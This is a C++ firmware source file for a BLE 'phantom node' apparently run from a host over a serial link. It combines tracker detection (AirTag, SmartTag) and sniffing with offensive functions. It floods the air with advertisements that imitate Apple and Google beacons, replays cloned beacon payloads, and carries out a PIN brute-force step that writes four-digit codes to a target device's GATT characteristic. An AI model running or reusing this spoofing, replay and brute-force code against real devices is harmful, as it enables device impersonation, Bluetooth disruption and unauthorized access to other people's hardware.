// src/modules/ble_module.cpp
#include "ble_module.h"
#include "serial_protocol.h"

BLEModule BLEMod;

void PhantomBLECallbacks::onResult(BLEAdvertisedDevice advertisedDevice) {
    BLEMod.processCapturedDevice(advertisedDevice);
}

BLEModule::BLEModule() {
    pBLEScan = nullptr;
    pAdvertising = nullptr;
    isScanning = false;
    isAdvertising = false;
    filterMacAddress = "";
    antiTrackingMode = false;
    lastScanTime = 0;
}

bool BLEModule::begin() {
    try {
        BLEDevice::init("SENTINEL_PHANTOM_NODE");
        pBLEScan = BLEDevice::getScan();
        pBLEScan->setAdvertisedDeviceCallbacks(new PhantomBLECallbacks());
        pBLEScan->setActiveScan(false); 
        pBLEScan->setInterval(100);
        pBLEScan->setWindow(99);
        
        pAdvertising = BLEDevice::getAdvertising();
        return true;
    } catch (...) {
        return false;
    }
}

void BLEModule::startSniffer(String targetMac, bool antiTracking, JsonDocument& response) {
    if (isAdvertising) {
        pAdvertising->stop();
        isAdvertising = false;
    }
    filterMacAddress = targetMac;
    filterMacAddress.toLowerCase();
    antiTrackingMode = antiTracking;
    isScanning = true;
    lastScanTime = millis();
    
    pBLEScan->start(0, nullptr, false);
    
    response["success"] = true;
    response["status"] = "sniffer_active";
    response["anti_tracking"] = antiTracking;
}

void BLEModule::stopSniffer(JsonDocument& response) {
    if (isScanning) {
        pBLEScan->stop();
        isScanning = false;
    }
    pBLEScan->clearResults();
    response["success"] = true;
    response["status"] = "sniffer_stopped";
}

void BLEModule::startFlooding(String ecosystem, uint16_t intervalMs, JsonDocument& response) {
    if (isScanning) {
        pBLEScan->stop();
        isScanning = false;
    }
    
    BLEAdvertisementData advData;
    ecosystem.toUpperCase();
    
    // Data payloads de proximidad estructurados para simular balizas comerciales
    if (ecosystem == "APPLE") {
        uint8_t apple_payload[] = {0x4C, 0x00, 0x02, 0x15, 0x49, 0x4D, 0x41, 0x46, 0x41, 0x4B, 0x45, 0x42, 0x45, 0x41, 0x43, 0x4F, 0x4E, 0x30, 0x30, 0x31, 0x00, 0x01, 0x00, 0x01, 0xAC};
        std::string rawData((char*)apple_payload, sizeof(apple_payload));
        advData.addData(rawData);
    } else if (ecosystem == "GOOGLE" || ecosystem == "ANDROID") {
        uint8_t google_payload[] = {0xE0, 0x03, 0x01, 0x02, 0x03, 0x04};
        std::string rawData((char*)google_payload, sizeof(google_payload));
        advData.addData(rawData);
    } else {
        uint8_t generic_payload[] = {0x06, 0x00, 0x01, 0x02};
        std::string rawData((char*)generic_payload, sizeof(generic_payload));
        advData.addData(rawData);
    }
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(intervalMs / 0.625);
    pAdvertising->setMaxInterval(intervalMs / 0.625);
    pAdvertising->start();
    
    isAdvertising = true;
    response["success"] = true;
    response["status"] = "flooding_active";
    response["ecosystem"] = ecosystem;
}

void BLEModule::cloneBeacon(const char* hexPayload, JsonDocument& response) {
    if (isScanning) {
        pBLEScan->stop();
        isScanning = false;
    }
    
    size_t len = strlen(hexPayload) / 2;
    uint8_t* binPayload = (uint8_t*)malloc(len);
    
    // Conversión de datos hexadecimales UART a binario de radio crudo
    for (size_t i = 0; i < len; i++) {
        sscanf(hexPayload + 2 * i, "%2hhx", &binPayload[i]);
    }
    
    BLEAdvertisementData advData;
    std::string rawData((char*)binPayload, len);
    advData.addData(rawData);
    free(binPayload);
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    isAdvertising = true;
    response["success"] = true;
    response["status"] = "replay_active";
}

void BLEModule::stopAdvertising(JsonDocument& response) {
    if (isAdvertising) {
        pAdvertising->stop();
        isAdvertising = false;
    }
    response["success"] = true;
    response["status"] = "tx_halted";
}

void BLEModule::parseManufacturerPayload(BLEAdvertisedDevice device, JsonObject& targetJson) {
    std::string data = device.getManufacturerData();
    if (data.length() < 2) {
        targetJson["type"] = "GENERIC_BLE";
        targetJson["vendor"] = "UNKNOWN";
        targetJson["is_tracker"] = false;
        return;
    }
    uint16_t companyId = (data[1] << 8) | data[0];
    targetJson["company_id"] = companyId;
    if (companyId == 0x004C) {
        targetJson["vendor"] = "Apple Inc.";
        if (data.length() >= 22 && data[2] == 0x12) {
            targetJson["type"] = "TRACKER_DEVICE";
            targetJson["subtype"] = "Apple AirTag";
            targetJson["is_tracker"] = true;
        } else {
            targetJson["type"] = "PERIPHERAL";
            targetJson["is_tracker"] = false;
        }
    } else if (companyId == 0x0075) {
        targetJson["vendor"] = "Samsung Electronics";
        if (data.length() >= 15 && data[2] == 0x01) {
            targetJson["type"] = "TRACKER_DEVICE";
            targetJson["subtype"] = "Samsung SmartTag";
            targetJson["is_tracker"] = true;
        } else {
            targetJson["type"] = "PERIPHERAL";
            targetJson["is_tracker"] = false;
        }
    } else {
        targetJson["vendor"] = "GENERIC_VENDOR";
        targetJson["type"] = "UNKNOWN";
        targetJson["is_tracker"] = false;
    }
}

void BLEModule::processCapturedDevice(BLEAdvertisedDevice device) {
    if (!isScanning) return;
    String currentMac = String(device.getAddress().toString().c_str());
    currentMac.toLowerCase();
    if (filterMacAddress.length() > 0 && currentMac != filterMacAddress) return;

    JsonDocument outDoc;
    JsonObject obj = outDoc.to<JsonObject>();
    obj["mac"] = currentMac;
    obj["name"] = device.haveName() ? device.getName().c_str() : "UNNAMED_NODE";
    obj["rssi"] = device.getRSSI();

    if (device.haveManufacturerData()) {
        parseManufacturerPayload(device, obj);
    } else {
        obj["type"] = "GENERIC_BLE";
        obj["vendor"] = "UNKNOWN";
        obj["is_tracker"] = false;
    }
    if (antiTrackingMode && !obj["is_tracker"]) return;

    Protocol.sendData("BLE_STREAM", outDoc);
}

bool BLEModule::connectGATT(String targetMac, JsonDocument& response) {
    if (isScanning) pBLEScan->stop();
    BLEAddress targetAddr(targetMac.c_str());
    BLEClient* pClient = BLEDevice::createClient();
    if (!pClient->connect(targetAddr)) {
        response["success"] = false;
        response["error"] = "connection_failed";
        if (isScanning) pBLEScan->start(0, nullptr, false);
        return false;
    }
    std::map<std::string, BLERemoteService*>* pServices = pClient->getServices();
    JsonArray servArr = response["services"].to<JsonArray>();
    for (auto it = pServices->begin(); it != pServices->end(); ++it) {
        servArr.add(it->first.c_str());
    }
    pClient->disconnect();
    delete pClient;
    response["mac"] = targetMac;
    response["success"] = true;
    if (isScanning) pBLEScan->start(0, nullptr, false);
    return true;
}

void BLEModule::runBruteForceStep(String targetMac, const char* serviceUuid, const char* charUuid, uint32_t code, JsonDocument& response) {
    if (isScanning) pBLEScan->stop();
    BLEAddress targetAddr(targetMac.c_str());
    BLEClient* pClient = BLEDevice::createClient();
    
    if (!pClient->connect(targetAddr)) {
        response["success"] = false;
        if (isScanning) pBLEScan->start(0, nullptr, false);
        return;
    }
    
    BLERemoteService* pRemoteService = pClient->getService(serviceUuid);
    if (pRemoteService != nullptr) {
        BLERemoteCharacteristic* pRemoteCharacteristic = pRemoteService->getCharacteristic(charUuid);
        if (pRemoteCharacteristic != nullptr && pRemoteCharacteristic->canWrite()) {
            char payloadStr[16];
            sprintf(payloadStr, "%04lu", code);
            pRemoteCharacteristic->writeValue((uint8_t*)payloadStr, strlen(payloadStr), false);
            response["success"] = true;
            response["attempted_code"] = code;
        }
    }
    pClient->disconnect();
    delete pClient;
    if (isScanning) pBLEScan->start(0, nullptr, false);
}

void BLEModule::loopTick() {
    if (isScanning && (millis() - lastScanTime > 8000)) {
        lastScanTime = millis();
    }
}